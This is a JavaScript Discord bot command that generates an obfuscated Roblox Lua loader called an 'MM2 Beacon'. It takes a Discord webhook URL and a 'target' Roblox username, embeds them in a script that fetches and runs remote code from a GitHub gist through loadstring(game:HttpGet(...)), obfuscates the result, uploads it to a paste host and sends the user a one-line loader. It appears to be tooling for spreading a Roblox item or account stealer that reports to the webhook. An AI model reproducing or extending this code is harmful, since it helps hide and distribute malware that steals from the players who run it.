import { obfuscate } from '../services/methylone.js';
import { ModalBuilder, TextInputBuilder, TextInputStyle, ActionRowBuilder } from 'discord.js';

export const data = {
  name: 'generate',
  description: 'Generate an obfuscated MM2 beacon loader',
};

export async function execute(interaction) {
  const modal = new ModalBuilder()
    .setCustomId('generateModal')
    .setTitle('MM2 Beacon Generator');

  const webhookInput = new TextInputBuilder()
    .setCustomId('webhook')
    .setLabel('Discord Webhook URL')
    .setStyle(TextInputStyle.Short)
    .setPlaceholder('https://discord.com/api/webhooks/...')
    .setRequired(true);

  const targetInput = new TextInputBuilder()
    .setCustomId('target')
    .setLabel('Target Roblox Username')
    .setStyle(TextInputStyle.Short)
    .setPlaceholder('roblox_username')
    .setRequired(true);

  const roleInput = new TextInputBuilder()
    .setCustomId('pingRole')
    .setLabel('Ping Role ID (optional)')
    .setStyle(TextInputStyle.Short)
    .setPlaceholder('123456789012345678')
    .setRequired(false);

  modal.addComponents(
    new ActionRowBuilder().addComponents(webhookInput),
    new ActionRowBuilder().addComponents(targetInput),
    new ActionRowBuilder().addComponents(roleInput)
  );

  await interaction.showModal(modal);

  const submitted = await interaction.awaitModalSubmit({
    time: 120000,
    filter: (i) => i.customId === 'generateModal' && i.user.id === interaction.user.id,
  });

  const webhook = submitted.fields.getTextInputValue('webhook');
  const target = submitted.fields.getTextInputValue('target');
  const pingRole = submitted.fields.getTextInputValue('pingRole') || '';

  const GIST_URL = "https://gist.githubusercontent.com/malik020859-ui/f513af3ff4e17351ea21a0fae5dba45e/raw/bde161ea34da4aec78dc1708cb0e3c42a0b6240d/ANTIWARES2";
  // ---- WRAPPER WITH ANONYMOUS FUNCTION ----
  // Wrapping in (function() ... end)() makes Methylone obfuscate the function body
  // instead of the raw script, preventing the "attempt to call a nil value" error.
  const baseScript = `
(function()
    _G.YOUR_WEBHOOK = '${webhook}'
    _G.TARGET_USER = '${target}'
    _G.PING_ROLE_ID = '${pingRole}'
    loadstring(game:HttpGet("${GIST_URL}"))()
end)()
`;
  // ---- END ----

  await submitted.deferReply();

  let obfuscated;
  try {
    obfuscated = await obfuscate(baseScript);
  } catch (err) {
    console.warn("Obfuscation failed, using raw wrapper:", err.message);
    obfuscated = baseScript;
  }

  const apiUrl = `https://api.rubis.app/v2/scrap?public=true&title=${encodeURIComponent('MM2 Beacon Script')}`;

  const pasteResponse = await fetch(apiUrl, {
    method: 'POST',
    headers: { 'Content-Type': 'text/plain' },
    body: obfuscated,
  });

  if (!pasteResponse.ok) {
    const errorText = await pasteResponse.text();
    console.error('Rubis error:', errorText);
    return submitted.editReply(`❌ Failed to host script on Rubis: ${pasteResponse.status} ${pasteResponse.statusText}`);
  }

  const pasteData = await pasteResponse.json();
  const id = pasteData.scrapID;

  const loadstring = `loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/${id}/raw"))()`;

  const dmMessage = `✅ **Loader generated!**\n\n**PC (code block):**\n\`\`\`lua\n${loadstring}\n\`\`\`\n**Mobile (plain text, tap to copy):**\n${loadstring}`;

  try {
    await interaction.user.send(dmMessage);
  } catch (err) {
    const channelMsg = await submitted.editReply(`✅ **Loader generated!**\n\n**PC:**\n\`\`\`lua\n${loadstring}\n\`\`\`\n**Mobile:**\n${loadstring}`);
    setTimeout(() => {
      channelMsg.delete().catch(() => {});
    }, 7000);
    return;
  }

  const confirmMsg = await submitted.editReply('✅ Loader generated and sent to your DMs!');
  setTimeout(() => {
    confirmMsg.delete().catch(() => {});
  }, 7000);
}